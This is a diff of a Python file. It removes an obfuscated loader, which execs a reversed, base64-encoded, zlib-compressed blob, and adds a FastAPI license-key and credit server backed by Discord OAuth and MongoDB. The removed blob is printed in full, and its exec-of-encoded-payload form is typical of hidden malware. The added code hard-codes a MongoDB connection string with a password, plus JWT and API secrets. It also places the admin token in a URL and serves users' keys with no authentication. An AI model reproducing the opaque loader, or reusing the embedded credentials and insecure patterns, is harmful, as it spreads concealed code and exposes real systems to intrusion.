@@ -1,2 +1,350 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'=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'))
+from fastapi import FastAPI, Request, Header
+from fastapi.responses import JSONResponse
+from pymongo import MongoClient
+from datetime import datetime, timedelta
+from fastapi.responses import RedirectResponse
+from pymongo import ReturnDocument
+import requests
+import jwt
+import os
+
+DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID", "DISCORD_CLIENT_ID_HERE")
+DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET", "DISCORD_CLIENT_SECRET_HERE")
+
+DISCORD_REDIRECT_URI = os.getenv(
+    "DISCORD_REDIRECT_URI",
+    "https://kantohub-license-api.onrender.com/auth/discord/callback"
+)
+
+OWNER_DISCORD_ID = os.getenv("OWNER_DISCORD_ID", "1378265291095543870")
+
+JWT_SECRET = os.getenv("JWT_SECRET", "super_secure_jwt_secret_123")
+JWT_ALGO = "HS256"
+
+API_SECRET = os.getenv("API_SECRET", "kantohub_super_secret_key_6919601061")
+
+MONGO_URI = os.getenv(
+    "MONGO_URI",
+    "mongodb+srv://kantohub:SUemxBr7P9LuMaZ@cluster0.ymqrtsw.mongodb.net/?appName=Cluster0"
+)
+
+client = MongoClient(MONGO_URI)
+db = client["kantohub"]
+keys_col = db["licenses"]
+credits_col = db["credits"]
+stock_col = db["stock"]
+
+app = FastAPI()
+
+DURATION_MAP = {
+    "3days": timedelta(days=3),
+    "1week": timedelta(weeks=1),
+    "1month": timedelta(days=30),
+    "permanent": None
+}
+
+# INIT STOCK
+stock_col.update_one(
+    {"name": "global"},
+    {"$setOnInsert": {"credits": 0}},
+    upsert=True
+)
+
+# ================= UTILS =================
+
+def authorized(auth: str):
+    if not auth:
+        return False
+    if auth.startswith("Bearer "):
+        auth = auth.replace("Bearer ", "")
+    return auth == API_SECRET
+
+def is_expired(k):
+    if k["expires_at"] is None:
+        return False
+    return datetime.utcnow() > k["expires_at"]
+
+# ================= ROUTES =================
+
+@app.get("/")
+def root():
+    return {"status": "KantoHub License API Online (MongoDB)"}
+
+@app.post("/api/add-key")
+async def add_key(req: Request, authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    data = await req.json()
+
+    if not data.get("system_name"):
+        return JSONResponse({"error": "system_name is required"}, status_code=400)
+
+    duration = data.get("duration", "permanent")
+    expires_at = None
+
+    if duration in DURATION_MAP and DURATION_MAP[duration]:
+        expires_at = datetime.utcnow() + DURATION_MAP[duration]
+
+    key_value = data["key"]
+    key_prefix = key_value.split("-", 1)[0]
+
+    keys_col.insert_one({
+        "system_name": data["system_name"],
+        "placeid": str(data["placeid"]),
+        "key": key_value,
+        "key_prefix": key_prefix,             
+        "server_name": data["server_name"],
+        "duration": duration,
+        "assigned_to": data["assigned_to"],
+        "generated_by": data["generated_by"],   
+        "timestamp_utc": datetime.utcnow(),
+        "expires_at": expires_at,
+        "used": False,
+        "used_placeid": None,
+        "used_at": None
+    })
+
+    return {"success": True}
+
+
+@app.post("/api/verify")
+async def verify(req: Request):
+    body = await req.json()
+    key = body.get("key")
+    placeid = str(body.get("placeid"))
+
+    k = keys_col.find_one({"key": key})
+    if not k:
+        return {"success": False, "reason": "invalid_key"}
+
+    if is_expired(k):
+        return {"success": False, "reason": "expired"}
+
+    if k["placeid"] != placeid:
+        return {"success": False, "reason": "wrong_place_id"}
+
+    if not k["used"]:
+        keys_col.update_one(
+            {"_id": k["_id"]},
+            {"$set": {
+                "used": True,
+                "used_placeid": placeid,
+                "used_at": datetime.utcnow()
+            }}
+        )
+        return {"success": True}
+
+    if k["used_placeid"] == placeid:
+        return {"success": True}
+
+    return {"success": False, "reason": "used_elsewhere"}
+
+@app.post("/api/check-key")
+async def check_key(req: Request):
+    body = await req.json()
+    discord_id = body.get("discord_id")
+
+    keys = list(keys_col.find({
+        "assigned_to.id": discord_id
+    }))
+
+    result = []
+    for k in keys:
+        if not is_expired(k):
+            result.append({
+                "system_name": k["system_name"],
+                "server_name": k["server_name"],
+                "key": k["key"],
+                "expires_at": k["expires_at"].isoformat() if k["expires_at"] else None
+            })
+
+    return {"keys": result}
+
+@app.post("/api/delete-key")
+async def delete_key(req: Request, authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    body = await req.json()
+    key = body.get("key")
+
+    res = keys_col.delete_one({"key": key})
+    if res.deleted_count == 0:
+        return JSONResponse({"error": "key_not_found"}, status_code=404)
+
+    return {"success": True}
+
+@app.post("/api/all-keys")
+async def all_keys(authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    keys = []
+    for k in keys_col.find():
+        if not is_expired(k):
+            keys.append({
+                "system_name": k["system_name"],
+                "server_name": k["server_name"],
+                "key": k["key"],
+                "placeid": k["placeid"],
+                "assigned_to": k["assigned_to"],
+                "expires_at": k["expires_at"].isoformat() if k["expires_at"] else None,
+                "used": k["used"]
+            })
+
+    return {"keys": keys}
+
+@app.get("/auth/discord/login")
+def discord_login():
+    url = (
+        "https://discord.com/oauth2/authorize"
+        f"?client_id={DISCORD_CLIENT_ID}"
+        f"&redirect_uri={DISCORD_REDIRECT_URI}"
+        "&response_type=code"
+        "&scope=identify"
+    )
+    return RedirectResponse(url)
+
+@app.get("/auth/discord/callback")
+def discord_callback(code: str):
+    # Exchange code → access token
+    token_res = requests.post(
+        "https://discord.com/api/oauth2/token",
+        data={
+            "client_id": DISCORD_CLIENT_ID,
+            "client_secret": DISCORD_CLIENT_SECRET,
+            "grant_type": "authorization_code",
+            "code": code,
+            "redirect_uri": DISCORD_REDIRECT_URI
+        },
+        headers={"Content-Type": "application/x-www-form-urlencoded"}
+    )
+
+    token_json = token_res.json()
+    access_token = token_json.get("access_token")
+
+    if not access_token:
+        return JSONResponse({"error": "discord_oauth_failed"}, status_code=400)
+    user_res = requests.get(
+        "https://discord.com/api/users/@me",
+        headers={"Authorization": f"Bearer {access_token}"}
+    )
+
+    user = user_res.json()
+    discord_id = user.get("id")
+    if discord_id != OWNER_DISCORD_ID:
+        return JSONResponse({"error": "not_authorized"}, status_code=403)
+    jwt_token = jwt.encode(
+        {
+            "discord_id": discord_id,
+            "exp": datetime.utcnow() + timedelta(hours=12)
+        },
+        JWT_SECRET,
+        algorithm=JWT_ALGO
+    )
+    return RedirectResponse(
+        f"https://banksfam.netlify.app/?admin_token={jwt_token}"
+    )
+
+@app.get("/auth/verify-admin")
+def verify_admin(authorization: str = Header(None)):
+    if not authorization:
+        return {"ok": False}
+
+    if authorization.startswith("Bearer "):
+        token = authorization.replace("Bearer ", "")
+    else:
+        token = authorization
+
+    try:
+        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGO])
+        if payload.get("discord_id") != OWNER_DISCORD_ID:
+            return {"ok": False}
+        return {"ok": True}
+    except jwt.ExpiredSignatureError:
+        return {"ok": False}
+    except jwt.InvalidTokenError:
+        return {"ok": False}
+
+@app.post("/api/stock-credits")
+async def stock_credits(req: Request, authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    amount = int((await req.json())["amount"])
+    stock_col.update_one({"name": "global"}, {"$inc": {"credits": amount}})
+    stock = stock_col.find_one({"name": "global"})
+    return {"success": True, "stock": stock["credits"]}
+
+@app.post("/api/check-stock")
+async def check_stock(authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    stock = stock_col.find_one({"name": "global"}) or {"credits": 0}
+    return {"credits": stock["credits"]}
+
+@app.post("/api/give-credits")
+async def give_credits(req: Request, authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse({"error": "unauthorized"}, status_code=403)
+
+    data = await req.json()
+    stock = stock_col.find_one({"name": "global"})
+
+    if stock["credits"] < data["credits"]:
+        return JSONResponse({"error": "not_enough_stock"}, status_code=400)
+
+    stock_col.update_one({"name": "global"}, {"$inc": {"credits": -data["credits"]}})
+
+    credits_col.update_one(
+        {"discord_id": data["discord_id"]},
+        {
+            "$set": {"prefix": data["prefix"]},
+            "$inc": {"credits": data["credits"]}
+        },
+        upsert=True
+    )
+
+    return {"success": True}
+
+@app.post("/api/use-credit")
+async def use_credit(req: Request, authorization: str = Header(None)):
+    if not authorized(authorization):
+        return JSONResponse(
+            {"success": False, "reason": "unauthorized"},
+            status_code=403
+        )
+
+    data = await req.json()
+    discord_id = data.get("discord_id")
+
+    if not discord_id:
+        return JSONResponse(
+            {"success": False, "reason": "discord_id_required"},
+            status_code=400
+        )
+
+    user = credits_col.find_one_and_update(
+        {
+            "discord_id": discord_id,
+            "credits": {"$gt": 0}
+        },
+        {
+            "$inc": {"credits": -1}
+        },
+        return_document=ReturnDocument.BEFORE
+    )
+
+    if not user:
+        return {
+            "success": False,
+            "reason": "no_enough_credits"
+        }
+
+    return {
+        "success": True,
+        "prefix": user["prefix"],
+        "remaining": user["credits"] - 1
+    }
